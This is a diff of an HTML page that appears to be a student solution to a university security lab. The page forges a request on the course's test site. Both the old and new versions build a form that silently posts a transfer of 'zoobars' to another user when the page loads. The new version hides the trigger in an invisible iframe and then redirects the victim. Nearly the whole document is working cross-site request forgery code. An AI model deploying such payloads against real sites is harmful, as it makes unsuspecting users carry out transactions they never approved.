@@ -1,36 +1,26 @@
 <html>
 <head>
+<form name= "transfer_form" method="post" action = "http://zoobar.csl.toronto.edu/transfer.php">
+
+  <input type="text" name="zoobars" value="2">
+  <input type="text" name="zb_recipient" value="abe">
+  <input type="submit" name="submission" value="Send">
+
+</form>
 <script>
-function func() {
-  var pseudo_form = document.createElement("form");
-  pseudo_form.name="transfer_form";
-  pseudo_form.method="post";
-  pseudo_form.action = "http://zoobar.csl.toronto.edu/transfer.php";
-  document.body.appendChild(pseudo_form);
-
-  var zoobars = document.createElement("input");
-  zoobars.setAttribute("type", "text");
-  zoobars.setAttribute("name", "zoobars");
-  zoobars.setAttribute("value", "1");
-  pseudo_form.appendChild(zoobars);
-
-  var zb_recip = document.createElement("input");
-  zb_recip.setAttribute("type", "text");
-  zb_recip.setAttribute("name", "zb_recipient");
-  zb_recip.setAttribute("value", "abe2");
-  pseudo_form.appendChild(zb_recip);
-
-  var submission = document.createElement("input");
-  submission.setAttribute("type", "submit");
-  submission.setAttribute("name", "submission");
-  submission.setAttribute("value", "Send");
-  pseudo_form.appendChild(submission);
-
-  pseudo_form.submit();
+function submit_form() {
+  document.getElementById("transfer_form").submit();
+}
+function redir() {
+  submit_form();
   window.location = "http://ece568.csl.toronto.edu/";
 }
 </script>
 </head>
-<body onLoad="func()">
+<body>
+<iframe 
+  style="visibility:hidden" 
+  onLoad=redir()>
+</iframe>
 </body>
 </html>
